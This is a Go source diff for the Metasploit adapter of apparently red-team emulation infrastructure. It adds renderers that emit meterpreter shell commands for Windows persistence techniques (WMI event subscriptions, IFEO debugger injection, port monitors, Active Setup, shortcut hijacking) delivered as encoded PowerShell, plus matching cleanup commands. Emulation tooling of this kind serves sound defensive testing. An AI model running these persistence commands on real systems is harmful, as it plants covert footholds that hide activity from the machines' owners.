@@ -20,10 +20,13 @@ package metasploit
 import (
 	"context"
 	"crypto/rand"
+	"encoding/base64"
+	"encoding/binary"
 	"encoding/hex"
 	"fmt"
 	"strings"
 	"time"
+	"unicode/utf16"
 
 	"github.com/rinfra/rinfra/internal/c2"
 	"github.com/rinfra/rinfra/internal/c2/deploy"
@@ -477,10 +480,32 @@ func msfCleanupCommand(t domain.Technique) (string, bool) {
 	if err != nil || !ok {
 		return "", false
 	}
-	if prim.Kind == c2.PrimScheduledTask {
+	switch prim.Kind {
+	case c2.PrimScheduledTask:
 		return fmt.Sprintf(`shell schtasks /delete /tn "%s" /f`, prim.Arg("task_name")), true
+	case c2.PrimShortcutModification:
+		script := fmt.Sprintf("Remove-Item -Path '%s' -Force -ErrorAction SilentlyContinue", psQuote(prim.Arg("shortcut_path")))
+		return fmt.Sprintf("shell powershell -NoProfile -EncodedCommand %s", encodePSCommand(script)), true
+	case c2.PrimWMIEventSubscription:
+		script := fmt.Sprintf(
+			"Get-WmiObject __FilterToConsumerBinding -Namespace root\\subscription | Where-Object {$_.Consumer -match '%s'} | Remove-WmiObject;"+
+				"Get-WmiObject __EventFilter -Namespace root\\subscription -Filter \"Name='%s'\" | Remove-WmiObject;"+
+				"Get-WmiObject CommandLineEventConsumer -Namespace root\\subscription -Filter \"Name='%s'\" | Remove-WmiObject",
+			psQuote(prim.Arg("consumer_name")), psQuote(prim.Arg("filter_name")), psQuote(prim.Arg("consumer_name")),
+		)
+		return fmt.Sprintf("shell powershell -NoProfile -EncodedCommand %s", encodePSCommand(script)), true
+	case c2.PrimIFEOInjection:
+		key := fmt.Sprintf(`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%s`, prim.Arg("target_image"))
+		return fmt.Sprintf("shell reg delete \"%s\" /v Debugger /f", key), true
+	case c2.PrimPortMonitor:
+		key := fmt.Sprintf(`HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\%s`, prim.Arg("monitor_name"))
+		return fmt.Sprintf("shell reg delete \"%s\" /f", key), true
+	case c2.PrimActiveSetup:
+		key := fmt.Sprintf(`HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\%s`, prim.Arg("component_id"))
+		return fmt.Sprintf("shell reg delete \"%s\" /f", key), true
+	default:
+		return "", false
 	}
-	return "", false
 }
 
 // renderMsfPrimitive renders a portable primitive into a meterpreter/shell
@@ -510,12 +535,55 @@ func renderMsfPrimitive(p c2.Primitive) (string, error) {
 		return fmt.Sprintf("download \"%s\"", p.Arg("path")), nil
 	case c2.PrimScheduledTask:
 		return fmt.Sprintf(`shell schtasks /create /tn "%s" /tr whoami /sc once /st 00:00`, p.Arg("task_name")), nil
+	case c2.PrimShortcutModification:
+		script := fmt.Sprintf(
+			"$s=(New-Object -ComObject WScript.Shell).CreateShortcut('%s');$s.TargetPath='%s';$s.Arguments='%s';$s.Save()",
+			psQuote(p.Arg("shortcut_path")), psQuote(p.Arg("target")), psQuote(p.Arg("arguments")),
+		)
+		return fmt.Sprintf("shell powershell -NoProfile -EncodedCommand %s", encodePSCommand(script)), nil
+	case c2.PrimWMIEventSubscription:
+		script := fmt.Sprintf(
+			"$f=Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{Name='%s';EventNamespace='root\\cimv2';QueryLanguage='WQL';Query='%s'};"+
+				"$c=Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name='%s';CommandLineTemplate='%s'};"+
+				"Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c}",
+			psQuote(p.Arg("filter_name")), psQuote(p.Arg("query")), psQuote(p.Arg("consumer_name")), psQuote(p.Arg("command")),
+		)
+		return fmt.Sprintf("shell powershell -NoProfile -EncodedCommand %s", encodePSCommand(script)), nil
+	case c2.PrimIFEOInjection:
+		key := fmt.Sprintf(`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%s`, p.Arg("target_image"))
+		return fmt.Sprintf("shell reg add \"%s\" /v Debugger /t REG_SZ /d \"%s\" /f", key, p.Arg("debugger")), nil
+	case c2.PrimPortMonitor:
+		key := fmt.Sprintf(`HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\%s`, p.Arg("monitor_name"))
+		return fmt.Sprintf("shell reg add \"%s\" /v Driver /t REG_SZ /d \"%s\" /f", key, p.Arg("driver")), nil
+	case c2.PrimActiveSetup:
+		key := fmt.Sprintf(`HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\%s`, p.Arg("component_id"))
+		return fmt.Sprintf("shell reg add \"%s\" /v StubPath /t REG_SZ /d \"%s\" /f", key, p.Arg("stub_path")), nil
 	default:
 		if cmd, ok := c2.DiscoveryCommand(p.Kind); ok {
 			return fmt.Sprintf("shell cmd /c \"%s\"", cmd), nil
 		}
 		return "", fmt.Errorf("metasploit: unsupported primitive %q", p.Kind)
 	}
+}
+
+// psQuote escapes a value for embedding in a single-quoted PowerShell string
+// literal by doubling any embedded single quote — PowerShell's own escaping
+// rule (a WQL query value may legitimately contain one).
+func psQuote(s string) string {
+	return strings.ReplaceAll(s, "'", "''")
+}
+
+// encodePSCommand base64-encodes a PowerShell script as UTF-16LE for
+// -EncodedCommand delivery, avoiding every layer of shell/console quote
+// nesting a plaintext -Command string would otherwise hit (notably
+// Metasploit's own fragile `-a '-c "%s"'` wrapping used by PrimPowerShell).
+func encodePSCommand(script string) string {
+	u16 := utf16.Encode([]rune(script))
+	b := make([]byte, len(u16)*2)
+	for i, r := range u16 {
+		binary.LittleEndian.PutUint16(b[i*2:], r)
+	}
+	return base64.StdEncoding.EncodeToString(b)
 }
 
 func msfPayloadForProtocol(protocol string) string {
